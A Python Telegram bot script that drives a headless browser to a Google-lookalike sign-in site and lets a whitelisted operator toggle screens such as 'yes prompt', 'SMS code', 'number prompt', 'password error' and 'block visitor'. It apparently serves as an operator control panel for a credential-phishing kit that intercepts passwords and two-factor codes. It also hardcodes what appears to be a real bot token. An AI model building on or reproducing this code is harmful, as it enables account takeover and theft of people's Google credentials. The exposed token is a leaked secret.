import logging
import asyncio
import os
from dotenv import load_dotenv
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from playwright.async_api import async_playwright

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN", "8766574780:AAEiQ6AYBMvGPrT5lb_WaKbITEfek_8X66I")
TARGET_URL = os.getenv("TARGET_URL", "https://corevista-netgoogle.lovable.app")

AUTHORIZED_USER_IDS = [6546086469]
GROUP_CHAT_ID = 6546086469

SECURITY_PREFS = {
    "yes_prompt": True, "sms_code_ii": True, "number_prompt": True,
    "password_error": True, "block_visitor": True, "success": True
}

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔐 TAO Bot Active\nUse /status or send password to test.")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = "🔒 Preferences:\n\n"
    for k, v in SECURITY_PREFS.items():
        text += f"{'✅' if v else '❌'} {k.replace('_', ' ').title()}\n"
    await update.message.reply_text(text)

async def toggle(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /toggle password_error")
        return
    opt = context.args[0].lower()
    if opt in SECURITY_PREFS:
        SECURITY_PREFS[opt] = not SECURITY_PREFS[opt]
        await update.message.reply_text(f"{opt.replace('_',' ').title()} is now {'ON' if SECURITY_PREFS[opt] else 'OFF'}")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in AUTHORIZED_USER_IDS:
        return await update.message.reply_text("❌ Unauthorized")
    
    text = update.message.text.strip()
    if text.startswith('/'): return

    await update.message.reply_text("🔄 Testing login...")
    success, msg, action = await attempt_login_with_security(text)
    alert = f"{'✅' if success else '❌'} {msg}\nAction: {action}"
    await update.message.reply_text(alert)

    if GROUP_CHAT_ID and not success:
        try:
            await context.bot.send_message(chat_id=GROUP_CHAT_ID, text=f"🚨 Alert:\n{alert}")
        except:
            pass

async def attempt_login_with_security(_):
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()
        try:
            await page.goto(TARGET_URL, wait_until="networkidle", timeout=20000)
            await asyncio.sleep(4)
            return True, "Google Sign-In Page Loaded", "Ready"
        except Exception as e:
            return False, f"Error: {str(e)[:80]}", "Failed"
        finally:
            await browser.close()

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("toggle", toggle))
    app.add_handler(MessageHandler(filters.TEXT & \~filters.COMMAND, handle_message))
    print("🚀 Bot running...")
    app.run_polling()

if __name__ == "__main__":
    main()